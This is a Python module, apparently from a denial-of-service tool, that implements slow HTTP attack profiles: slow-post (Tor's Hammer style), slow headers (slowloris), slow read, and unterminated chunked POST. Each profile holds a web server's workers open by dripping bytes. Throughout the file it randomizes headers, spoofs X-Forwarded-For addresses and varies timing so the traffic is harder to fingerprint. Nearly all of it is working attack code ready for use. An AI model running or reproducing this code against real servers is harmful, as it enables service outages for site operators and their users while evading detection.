"""Attack profiles.

Each profile opens one connection and slowly consumes it so that a
vulnerable web server ties up a worker thread/process waiting on it:

* ``slow-post``   - send headers with a big Content-Length, then drip the
                    body one byte at a time (classic Tor's Hammer).
* ``slow-headers``- never finish the request headers (slowloris).
* ``slow-read``   - send a full request, then read the response in tiny
                    chunks with pauses (slow-read / slow-bytes).
* ``chunked``     - send POST with Transfer-Encoding: chunked and drip
                    small chunks without the terminating 0-chunk.

Every connection randomizes its headers, User-Agent, path query and timing
to make the traffic harder to fingerprint.
"""

from __future__ import annotations

import asyncio
import random
import string
from abc import ABC, abstractmethod

from .config import Config
from .stats import Stats

_ALNUM = string.ascii_letters + string.digits
_ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
]


def _rand_ip() -> str:
    return ".".join(str(random.randint(0, 255)) for _ in range(4))


def _rand_token(length: int = 8) -> str:
    return "".join(random.choice(_ALNUM) for _ in range(length))


def _rand_hex(length: int = 12) -> str:
    return "".join(random.choice("0123456789abcdef") for _ in range(length))


def _random_header_name(name: str) -> str:
    return "".join(
        ch.upper() if random.random() < 0.5 else ch.lower() if ch.isalpha() else ch for ch in name
    )


def _path(config: Config) -> str:
    if not config.randomize_path:
        return config.path
    delimiter = "&" if "?" in config.path else "?"
    return f"{config.path}{delimiter}{_rand_token(8)}"


def _merge_headers(base_headers: list[str], custom_headers: list[str]) -> list[str]:
    """Merge custom headers into base headers.

    Custom headers are applied AFTER base headers so they can override defaults.
    """
    if not custom_headers:
        return base_headers
    override = {h.split(":", 1)[0].strip().lower(): h for h in custom_headers}
    merged: list[str] = []
    for header in base_headers:
        name = header.split(":", 1)[0].strip().lower()
        if name not in override:
            merged.append(header)
    merged.extend(custom_headers)
    return merged


def _base_headers(config: Config, ua: str) -> list[str]:
    headers = [
        f"Host: {config.header_host}",
        f"User-Agent: {ua}",
        f"Accept: {random.choice(_ACCEPTS)}",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate",
        "Connection: keep-alive",
        "Keep-Alive: 900",
        "X-Requested-With: XMLHttpRequest",
    ]
    if random.random() < 0.5:
        headers.append(f"Referer: https://{config.header_host}/")
    if random.random() < 0.35:
        headers.append("Cache-Control: no-cache")
    if random.random() < 0.25:
        headers.append("DNT: 1")
    if random.random() < 0.25:
        headers.append("TE: trailers, deflate")
    if random.random() < 0.5:
        headers.append(f"X-Forwarded-For: {_rand_ip()}")
    if random.random() < 0.4:
        headers.append(f"X-Trace-Id: {_rand_hex(6)}")
    # Randomize header casing and order for each connection.
    headers = [
        f"{_random_header_name(h.split(':', 1)[0])}: {h.split(':', 1)[1].lstrip()}" for h in headers
    ]
    first, rest = headers[:1], headers[1:]
    random.shuffle(rest)
    headers = first + rest
    return _merge_headers(headers, config.custom_headers)


def _dribble(n: int = 1) -> bytes:
    return "".join(random.choice(_ALNUM) for _ in range(n)).encode()


async def _write(writer: asyncio.StreamWriter, data: bytes, stats: Stats) -> None:
    writer.write(data)
    await writer.drain()
    stats.bytes_sent += len(data)


async def _halt(stop: asyncio.Event, config: Config) -> None:
    """Sleep a random delay, but wake early if ``stop`` is set."""
    try:
        await asyncio.wait_for(stop.wait(), timeout=config.random_delay())
    except TimeoutError:
        pass


class Profile(ABC):
    """Base class for attack profiles."""

    name = ""

    @abstractmethod
    async def run(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        config: Config,
        ua: str,
        stats: Stats,
        stop: asyncio.Event,
    ) -> None:
        """Dribble the connection until ``stop`` fires or the profile ends."""


class SlowPost(Profile):
    name = "slow-post"

    async def run(self, reader, writer, config, ua, stats, stop):
        length = random.randint(config.base_post_length // 2, config.base_post_length)
        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        method = config.method or "POST"
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats)
        sent = 0
        while not stop.is_set() and sent < length:
            await _write(writer, _dribble(), stats)
            sent += 1
            await _halt(stop, config)


class SlowPostHeaders(Profile):
    name = "slow-post-headers"

    async def run(self, reader, writer, config, ua, stats, stop):
        length = random.randint(config.base_post_length // 2, config.base_post_length)
        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        method = config.method or "POST"
        lines = [f"{method} {_path(config)} HTTP/1.1"] + headers
        while lines and not stop.is_set():
            await _write(writer, (lines.pop(0) + "\r\n").encode(), stats)
            await _halt(stop, config)
        if not stop.is_set():
            await _write(writer, b"\r\n", stats)
        sent = 0
        while not stop.is_set() and sent < length:
            await _write(writer, _dribble(), stats)
            sent += 1
            await _halt(stop, config)


class SlowHeaders(Profile):
    name = "slow-headers"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Send the request line with the Host/UA headers but never the
        # terminating blank line, so the request stays "in progress".
        method = config.method or "GET"
        req = f"{method} {_path(config)} HTTP/1.1\r\n".encode()
        await _write(writer, req, stats)
        # Send custom headers first (if any), then random X-headers
        if config.custom_headers:
            for header in config.custom_headers:
                await _write(writer, (header + "\r\n").encode(), stats)
                await _halt(stop, config)
        while not stop.is_set():
            key = f"X-{_rand_hex(6)}"
            value = _rand_hex(8)
            await _write(writer, f"{key}: {value}\r\n".encode(), stats)
            await _halt(stop, config)


class SlowRead(Profile):
    name = "slow-read"

    async def run(self, reader, writer, config, ua, stats, stop):
        headers = _base_headers(config, ua)
        method = config.method or "GET"
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats)
        while not stop.is_set():
            try:
                chunk = await asyncio.wait_for(reader.read(8), timeout=config.connect_timeout * 2)
            except TimeoutError:
                continue
            if not chunk:  # server closed the connection
                break
            stats.bytes_received += len(chunk)
            await _halt(stop, config)


class Chunked(Profile):
    name = "chunked"

    async def run(self, reader, writer, config, ua, stats, stop):
        length = random.randint(config.base_post_length // 2, config.base_post_length)
        headers = _base_headers(config, ua)
        headers.append("Transfer-Encoding: chunked")
        headers.append("Content-Type: application/x-www-form-urlencoded")
        method = config.method or "POST"
        req = (
            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats)
        sent = 0
        while not stop.is_set() and sent < length:
            size = random.randint(1, 4)
            payload = _dribble(size)
            await _write(writer, f"{size:x}\r\n".encode() + payload + b"\r\n", stats)
            sent += size
            await _halt(stop, config)


PROFILES: dict[str, type[Profile]] = {
    SlowPost.name: SlowPost,
    SlowPostHeaders.name: SlowPostHeaders,
    SlowHeaders.name: SlowHeaders,
    SlowRead.name: SlowRead,
    Chunked.name: Chunked,
}
